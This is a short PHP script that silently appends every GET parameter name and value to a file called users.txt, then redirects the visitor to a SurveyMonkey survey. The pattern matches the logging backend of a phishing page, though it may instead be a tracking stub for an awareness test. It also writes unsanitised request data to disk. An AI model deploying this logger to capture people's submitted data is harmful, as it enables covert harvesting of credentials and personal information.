:<?php
echo "<meta http-equiv='refresh' content='0; url=https://www.surveymonkey.com/r/9C72S5L'>";
$handle = fopen("users.txt", "a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 